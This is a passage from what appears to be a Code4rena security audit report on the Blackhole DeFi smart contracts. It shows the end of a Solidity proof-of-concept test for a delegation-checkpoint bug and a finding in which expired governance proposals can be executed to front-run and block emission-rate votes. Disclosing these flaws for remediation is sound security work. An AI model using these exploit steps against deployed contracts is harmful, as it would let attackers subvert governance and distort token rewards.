class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    constructor(address _fromOwner, address _toOwner, address _fromDelegate, address _toDelegate) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        fromOwner = _fromOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        toOwner = _toOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        fromDelegate = _fromDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        toDelegate = _toDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function useMoveTokenDeledates(uint256 tokenId) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        idToOwner[tokenId] = address(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.moveTokenDelegates(cpData, fromOwner, toOwner, tokenId, ownerOf);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function ownerOf(uint256 tokenId) public view returns (address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return idToOwner[tokenId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function modifyData(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address addr,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint32 num,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.Checkpoint memory checkpoint,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint32 numCheckpoints\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        cpData.checkpoints[addr][num] = checkpoint;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        cpData.numCheckpoints[addr] = numCheckpoints;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function showData(address addr, uint32 num) public view returns (VotingDelegationLib.Checkpoint memory) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return cpData.checkpoints[addr][num];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function showNumberOfCheckPoints(address addr) public view returns (uint32) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return cpData.numCheckpoints[addr];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract MyTest3 is Test {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    MockContractDelegates public contractDelegates;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public owner = makeAddr(\u0026quot;owner\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public alice = makeAddr(\u0026quot;alice\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public aliceDelegate = makeAddr(\u0026quot;aliceDelegate\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public bob = makeAddr(\u0026quot;bob\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public bobDelegate = makeAddr(\u0026quot;bobDelegate\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setUp() public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 1000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(owner);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates = new MockContractDelegates(alice, bob, aliceDelegate, bobDelegate);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256[] memory tokenIds = new uint256[](3);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[0] = 1;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[1] = 2;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[2] = 3;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.Checkpoint memory checkpoint =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            VotingDelegationLib.Checkpoint({timestamp: block.timestamp, tokenIds: tokenIds});\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.modifyData(alice, 0, checkpoint, 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function test__someTest3() public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(alice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.useMoveTokenDeledates(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(alice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.useMoveTokenDeledates(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;ALICEs tokens:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(alice, 1));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(alice, 2));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;BOBs tokens:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(bob, 1));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // alice was supposed to have token 3 left in checkpoint, but she does not\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e//   ALICEs tokens:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   BOBs tokens:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   Token ID 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   Token ID 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function logCheckpointTokenIds(VotingDelegationLib.Checkpoint memory cp) internal view {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 len = cp.tokenIds.length;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; len; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            console.log(\u0026quot;Token ID\u0026quot;, cp.tokenIds[i]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-4\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-54\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-65\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\" style=\"position:relative;\"\u003e\u003ca href=\"#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\" aria-label=\"m 15 l2governorexecute accepts expired  defeated proposals attacker front runs blackgovernor nudge blocks legitimate emission rate votes freezes tail emissions permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-21\"\u003e[M-15] \u003ccode\u003eL2Governor.execute()\u003c/code\u003e accepts \u003ccode\u003eExpired\u003c/code\u003e / \u003ccode\u003eDefeated\u003c/code\u003e proposals, attacker front-runs \u003ccode\u003eBlackGovernor\u003c/code\u003e \u003ccode\u003enudge()\u003c/code\u003e, blocks legitimate emission-rate votes, freezes tail emissions\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-33\"\u003elonelybones\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-139\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-301\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-525\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-493\"\u003emahadev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-31\"\u003ePocas\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-530\"\u003eRorschach\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-10\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-10\" aria-label=\"finding description 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eL2Governor.execute()\u003c/code\u003e function (in \u003ccode\u003econtracts/governance/L2Governor.sol\u003c/code\u003e, inherited by \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e) erroneously permits execution of \u003ccode\u003eExpired\u003c/code\u003e or \u003ccode\u003eDefeated\u003c/code\u003e proposals. An attacker can exploit this by executing an \u003ccode\u003eExpired\u003c/code\u003e proposal targeting \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e. This action, due to a quirk in \u003ccode\u003enudge()\u003c/code\u003e’s status interpretation, sets a one-time-per-epoch flag, thereby blocking a legitimately Succeeded emission-change proposal for the same period and subverting voter consensus on tail emission rates.\u003c/p\u003e\n\u003cp\u003eThe root cause is an overly permissive state check in \u003ccode\u003eL2Governor.execute()\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eFile: \u003ccode\u003econtracts/governance/Governor.sol#L317-L320\u003c/code\u003e (within \u003ccode\u003eL2Governor.execute()\u003c/code\u003e)\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExpired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* ... */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;\u0026lt;\u0026lt; FLAW\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis allows non-Succeeded proposals to proceed to execution. BlackGovernor.sol inherits this, and its \u003ccode\u003epropose()\u003c/code\u003e function restricts targets to \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e function contains a one-time-per-epoch guard (require (\u003ccode\u003e!proposals[_period], ...); proposals[_period] = true;\u003c/code\u003e). When \u003ccode\u003enudge()\u003c/code\u003e is called via the flawed \u003ccode\u003eexecute()\u003c/code\u003e, its call to \u003ccode\u003eIBlackGovernor.status()\u003c/code\u003e (no args) reads the \u003ccode\u003eL2Governor.status\u003c/code\u003e public state variable (defaulting to \u003ccode\u003eProposalState.Pending - 0\u003c/code\u003e). Consequently, \u003ccode\u003enudge()\u003c/code\u003e always takes its “no change” branch for \u003ccode\u003etailEmissionRate\u003c/code\u003e and sets the \u003ccode\u003eproposals[_period]\u003c/code\u003e flag.\u003c/p\u003e\n\u003ch3 id=\"impact-11\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAn attacker exploits this by front-running the execution of a Succeeded BlackGovernor proposal (for \u003ccode\u003eMinter.nudge()\u003c/code\u003e) with an \u003ccode\u003eExpired\u003c/code\u003e one for the same target emission period.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEmission rate manipulation:\u003c/strong\u003e The attacker forces the BLACK token’s tail emission rate trend to “no change,” overriding voter consensus (e.g., for an increase or decrease).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance subversion:\u003c/strong\u003e Legitimate, Succeeded proposals for \u003ccode\u003eMinter.nudge()\u003c/code\u003e for that epoch are rendered un-executable because the \u003ccode\u003eproposals[active_period]\u003c/code\u003e flag in \u003ccode\u003eMinterUpgradeable\u003c/code\u003e has already been set by the attacker’s transaction.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLow cost, significant consequence:\u003c/strong\u003e Any account can execute an Expired proposal, impacting a core tokenomic control mechanism. This leads to misaligned emission rates compared to voter intent, affecting rewards for LPs and veBLACK holders.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-10\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA detailed Hardhat test script (\u003ccode\u003etest/GovernorExecuteGrief.test.js\u003c/code\u003e) demonstrating this vulnerability using the project’s in-scope contracts has been developed and verified.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey PoC steps summary:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSetup:\u003c/strong\u003e Deployed BlackGovernor, MinterUpgradeable, and all necessary dependencies. Advanced Minter to its tail emission phase. Proposer created \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e and \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e targeting \u003ccode\u003eMinter.nudge()\u003c/code\u003e for the same future emission period.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eState transitions:\u003c/strong\u003e \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e reached state Expired (6). \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e was voted to state Succeeded (4).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExploitation:\u003c/strong\u003e Attacker executed \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e. This called \u003ccode\u003eMinter.nudge()\u003c/code\u003e, which set \u003ccode\u003eproposals[target_period] = true\u003c/code\u003e and \u003ccode\u003etailEmissionRate\u003c/code\u003e to “no change.”\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVerification:\u003c/strong\u003e A subsequent attempt to execute \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e reverted (due to \u003ccode\u003eMinter.nudge()\u003c/code\u003e’s guard), blocking the intended emission rate change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCorrect \u003ccode\u003eL2Governor.execute()\u003c/code\u003e state check: Modify \u003ccode\u003econtracts/governance/Governor.sol#L317-L320\u003c/code\u003e to only allow execution of Succeeded 